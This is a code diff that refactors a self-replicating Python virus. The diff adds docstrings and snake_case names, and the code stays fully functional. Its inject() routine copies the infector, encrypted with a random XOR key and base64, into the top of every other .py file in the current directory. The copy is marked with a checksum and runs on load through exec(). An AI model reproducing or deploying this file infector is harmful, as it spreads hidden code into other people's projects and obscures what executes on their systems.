@@ -9,77 +9,107 @@ import random
 import string
 
 
-def encrypt(clearText, key):
+def encrypt(clear_text, key):
+    """
+    Encrypts a string using the given key.
 
-    reps = (len(clearText)-1)//len(key) + 1
-    encoded = clearText.encode("ascii")
+    Args:
+        clear_text (str): The string to encrypt.
+        key (str): The encryption key.
 
-    key = (key * reps)[:len(clearText)].encode("ascii")
+    Returns:
+        str: The encrypted string as a base64-encoded string.
+    """
 
-    cipherText = bytes([i1 ^ i2 for (i1, i2) in zip(encoded, key)])
+    reps = (len(clear_text)-1)//len(key) + 1
+    encoded = clear_text.encode("ascii")
 
-    # Return base64 string
-    return base64.b64encode(cipherText).decode("ascii")
+    key = (key * reps)[:len(clear_text)].encode("ascii")
+
+    cipher_text = bytes([i1 ^ i2 for (i1, i2) in zip(encoded, key)])
+
+    return base64.b64encode(cipher_text).decode("ascii")
 
 
-def decrypt(cipherText, key):
-    reps = (len(cipherText)-1)//len(key) + 1
-    encoded64_bytes = cipherText.encode("ascii")
+def decrypt(cipher_text, key):
+    """
+    Decrypts a base64-encoded string using the given key.
+
+    Args:
+        cipher_text (str): The base64-encoded string to decrypt.
+        key (str): The decryption key.
+
+    Returns:
+        str: The decrypted string.
+    """
+
+    reps = (len(cipher_text)-1)//len(key) + 1
+    encoded64_bytes = cipher_text.encode("ascii")
 
     encoded_bytes = base64.b64decode(encoded64_bytes)
 
-    key = (key * reps)[:len(cipherText)].encode("ascii")
+    key = (key * reps)[:len(cipher_text)].encode("ascii")
 
-    clearText = bytes([i1 ^ i2 for (i1, i2) in zip(encoded_bytes, key)])
-    return clearText.decode("ascii")
+    clear_text = bytes([i1 ^ i2 for (i1, i2) in zip(encoded_bytes, key)])
+    return clear_text.decode("ascii")
 
 
 # DELIMITER:START
 
 
 def inject():
+    """
+    Injects the contents of the current file into all Python files in the
+    current directory, encrypted and protected by a checksum.
+    """
 
-    injection = open(__file__, "r")
-    injectionText = injection.read()
-    injection.close()
+    with open(__file__, "r") as injection:
+        injection_text = injection.read()
 
-    injectionText = injectionText.split("# DELIMITER:END\n")[
+    injection_text = injection_text.split("# DELIMITER:END\n")[
         0]
 
-    injectionCryptoText = "# DELIMITER:CRYPTO\n" + injectionText.split("# DELIMITER:CRYPTO\n")[
+    injection_crypto_text = "# DELIMITER:CRYPTO\n" + injection_text.split("# DELIMITER:CRYPTO\n")[
         1].split("# DELIMITER:START\n")[0]
 
-    injectionScriptText = injectionText.split("# DELIMITER:START\n")[1]
+    injection_script_text = injection_text.split("# DELIMITER:START\n")[1]
 
     # Get all python files in the current directory
-    pyFiles = glob.glob("*.py")
+    py_files = glob.glob("*.py")
 
     # Remove the initial
-    pyFiles.remove(os.path.split(__file__)[1])
+    py_files.remove(os.path.split(__file__)[1])
 
-    for file in pyFiles:
+    for file in py_files:
 
-        script = open(file, "r")
-        scriptText = script.read()
+        with open(file, "r") as script:
+            script_text = script.read()
 
         checksum = hashlib.md5(file.encode("ascii")).hexdigest()
-        firstLine = scriptText.split("\n")[0]
+        first_line = script_text.split("\n")[0]
 
-        if checksum in firstLine:
+        if checksum in first_line:
             continue
 
-        injected = open(file + ".injected", "w")
+        with open(file + ".injected", "w") as injected:
+            injected.write("# Checksum = " + checksum + "\n" + injection_crypto_text + "# DELIMITER:START\n" +
+                           encrypt_injection(injection_script_text) + "\n# DELIMITER:END\n" + script_text)
 
-        injected.write("# Checksum = " + checksum + "\n" + injectionCryptoText + "# DELIMITER:START\n" + encryptInjection(
-            injectionScriptText) + "\n# DELIMITER:END\n" + scriptText)
-
-        script.close()
-        injected.close()
         os.unlink(file)
         os.rename(file + ".injected", file)
 
 
-def encryptInjection(injection):
+def encrypt_injection(injection: str) -> str:
+    """
+    Encrypts the given 'injection' string using a randomly generated key, and returns the payload string
+    that can be executed to decrypt and run the injection text.
+
+    Args:
+        injection (str): The injection text to be encrypted.
+
+    Returns:
+        str: The payload string that can be executed to decrypt and run the injection text.
+    """
 
     key = ""
 
@@ -90,16 +120,18 @@ def encryptInjection(injection):
     base64_bytes = base64.b64encode(key_bytes)
     base64_key = base64_bytes.decode('ascii')
 
-    encryptedInjection = encrypt(injection, key)
+    encrypted_injection = encrypt(injection, key)
 
-    payload = """
-encryptedInjection = "{}"
-key = "{}"
+    payload = f"""
+    
+encrypted_injection = "{encrypted_injection}"
+key = "{base64_key}"
 
-injectionText = decrypt(encryptedInjection, base64.b64decode(key.encode("ascii")).decode("ascii"))
+injection_text = decrypt(encrypted_injection, base64.b64decode(key.encode("ascii")).decode("ascii"))
 
-exec(injectionText)
-""".format(encryptedInjection, base64_key)
+exec(injection_text)
+
+"""
 
     return payload
 
